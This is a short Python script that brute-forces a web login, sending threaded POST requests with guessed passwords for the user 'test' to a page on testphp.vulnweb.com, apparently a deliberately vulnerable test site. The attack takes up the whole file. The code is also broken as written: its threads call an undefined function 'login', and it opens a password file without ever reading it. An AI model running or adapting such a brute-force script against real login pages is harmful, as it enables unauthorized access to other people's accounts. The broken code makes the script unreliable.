import requests
import threading
# import datetime
url = "http://testphp.vulnweb.com/userinfo.php"
# url = input("Enter url: ")

with open("pass.txt","r"):
	pass_list = {"aaaa","yash","test"}

def bruteforce(passwd):
	s = requests.session()
	# output = s.get(url) #get req.
	output = s.post(url,data={"uname":"test","pass":passwd})
	if "Logout" in output.content.decode():
		print("Password matched !! : ", passwd)
	else:
		print("Password not matched")

# login("test")

for i in pass_list:
	thread = threading.Thread(target=login, args=(i,))
	thread.start()